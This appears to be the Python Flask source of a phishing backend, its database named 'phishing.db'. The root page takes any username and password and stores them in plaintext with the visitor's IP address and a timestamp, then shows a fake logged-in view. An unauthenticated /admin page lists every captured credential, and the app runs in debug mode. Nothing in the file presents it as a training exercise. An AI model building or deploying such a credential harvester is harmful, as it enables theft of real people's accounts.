from flask import Flask, render_template, request
import sqlite3
from datetime import datetime

app = Flask(__name__)
DATABASE = "phishing.db"

# ---------- DATABASE ----------
def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            login_time TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

# ---------- USER PAGE ----------
@app.route("/", methods=["GET", "POST"])
def user_page():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        ip = request.remote_addr
        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO login_attempts (username, password, ip_address, login_time) VALUES (?, ?, ?, ?)",
            (username, password, ip, time)
        )
        conn.commit()
        conn.close()

        return render_template("user.html", logged_in=True)

    return render_template("user.html", logged_in=False)

# ---------- ADMIN ----------
@app.route("/admin")
def admin():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM login_attempts ORDER BY id DESC")
    data = cursor.fetchall()
    conn.close()
    return render_template("admin.html", data=data)

if __name__ == "__main__":
    app.run(debug=True)
